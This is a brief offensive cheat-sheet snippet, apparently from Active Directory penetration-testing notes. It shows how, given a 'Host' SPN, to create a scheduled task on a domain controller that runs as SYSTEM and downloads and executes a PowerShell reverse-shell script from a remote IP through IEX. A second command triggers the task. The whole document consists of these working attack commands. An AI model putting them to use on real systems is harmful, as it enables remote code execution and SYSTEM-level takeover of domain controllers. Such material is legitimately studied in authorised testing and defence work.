_Requires ‘Host’ SPN_

To create a task:

```powershell
# Mind the quotes. Use encoded commands if quoting becomes too much of a pain
schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dc.targetdomain.com /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"
```

To trigger the task:

```powershell
schtasks /RUN /TN "shell" /s dc.targetdomain.com
```